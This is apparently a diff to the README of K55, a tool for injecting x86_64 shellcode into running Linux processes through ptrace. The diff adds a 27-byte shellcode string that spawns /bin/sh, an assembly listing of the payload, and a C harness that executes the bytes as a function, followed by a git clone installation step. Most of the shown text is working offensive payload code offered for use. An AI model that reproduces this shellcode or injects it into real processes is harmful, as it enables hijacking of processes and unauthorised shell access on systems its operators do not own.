@@ -3,6 +3,7 @@
 ## About K55 
 The K55 payload injection tool is used for injecting x86_64 shellcode payloads into running processes. The utility was developed using modern C++11 techniques as well as some traditional C linux functions like ``ptrace()``. The shellcode spawned in the target process is 27 bytes and it executes /bin/sh (spawns a bash shell) within the target's address space.<br/>
 
+#### Shellcode String: ``"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"``<br/>  
 ## Assembly of The Payload
 ```asm
 main:
@@ -20,7 +21,21 @@ main:
     mov al, 0x3b
     syscall
 ```
+## C-Implementation of The Payload
+```c
+#include <stdio.h>
+#include <string.h>
 
+char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+int main()
+{
+    printf("len:%d bytes\n", strlen(code));
+    (*(void(*)()) code)();
+    return 0;
+}
+
+```
 
 ## Installation
 1. ``git clone https://github.com/josh0xA/K55.git``<br/>
